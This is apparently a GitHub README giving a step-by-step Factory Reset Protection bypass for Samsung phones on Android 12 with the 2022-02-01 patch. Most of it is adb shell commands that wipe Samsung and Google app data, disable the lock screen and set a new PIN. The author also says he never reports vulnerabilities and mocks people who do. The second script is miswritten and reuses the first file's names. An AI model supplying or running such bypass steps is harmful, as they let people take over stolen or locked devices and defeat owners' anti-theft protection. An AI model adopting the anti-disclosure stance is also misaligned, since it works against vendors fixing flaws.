  <h2 align="center">---=== All Models Works And Are Vulnerable IF Android 12 Is Installed ===---</h2>
  <h3 align="center">(Latest Security Patch from: <i>2022-02-01)</i></h3>
</p>

> :warning: **Patched from 2022-04-01**: you must find your way around, go go hack or die! I dont have any android device anymore so I cant try, if I will get one - I'll update this post! 

* [More info about the the CVC from Samsung here](https://security.samsungmobile.com/serviceWeb.smsb)

#### Security patch version for my device 

No worries, I got you covered with a newer version (they  are fast but not fast enough so I decided to share this wiki to the public - This hack works perfect for all Samsung devices with latest securit patch (2022-02-01) while the wiki is created it works awesome still (2022-02-21),.This method  does **NOT** work on Android 11 so you have an Android 11 FPR locked device so you can upgrade to the latest firmware from Samsung)

---

* I never report vulnerabilities to companies, they make their money if you are one of my followers here at [@Github](https://github.com/wuseman) and want to report anything to the idiots feel  feel free, I will succeed again and again and again so for me personally it does not matter BUT it may cause other users so think twice before contacting the companies, they have enough developers to figure out things on their own and be happy as long as it works! My [old screenshot method wich I found ](https://github.com/wuseman/Samsung_Galaxy.s10_FRP.Bypass) some idiot reported this vulnerability was patched fast unfortunately, but for whose benefit? Not to ours, just for the greedy companies out there.

* You have just hacked samsung's latest security patch and there are a thousand reasons why i do not use cell phones ;)

## Welcome Screen

#### Since adb shell is still open, clear all samsung applications so we can take control over lock settings without any bruteforcing: 

![](https://www.nr1.nu/hacking/android/Samsung_Galaxy.s10_plus_Android.v12.PREVIEWS/clear_all_samsung_apps.gif)
          
```sh
cmd package list packages|cut -d: -f2|egrep samsung > /storage/self/primary/clear.txt 
sed 's/^/pm clear --user 0 /g' /storage/self/primary/clear.txt  > /storage/self/primary/clear_script.sh 
sh -x /storage/self/primary/clear_script.sh 
```

```sh
cmd package list packages|cut -d: -f2|egrep google > /storage/self/primary/clear_google_apps.txt 
sed 's/^/pm clear --user 0 /g' /storage/self/primary/clear.txt  > /storage/self/primary/clear_google_apps.sh
sh -x /storage/self/primary/clear_script.sh 
```

#### Your lock settings is NOT disabled if you are using an FRP locked Device, however you can confirm this with cmd:

```sh
cmd lock_settings get-disabled
```

cmd lock_settings is the new way we used locksettings in past (you probably seen my wbruter script wich is very old and slow nowdays, use cmd instead) and since lock_settings was introduced in cmd we simply can use below to disable lock screen without any hacking:

```sh
cmd lock_settings set-disabled true 
```


#### Since we still love ADB and working in cli rather then GUI (at least that's me) set your pin code with: 

```sh
cmd locksettings --set-pin XXXX XXX
```

#### And for GUI fantasts, open settings and browse to Biometrics and Security either with below command or via your homescreen

```sh
am start -a android.settings.SETTINGS
```

#### Add your fingerprint and face recogntion and set your pin
         

#### You have just hacked the latest Security Patch from Samsung (2022-02-01)
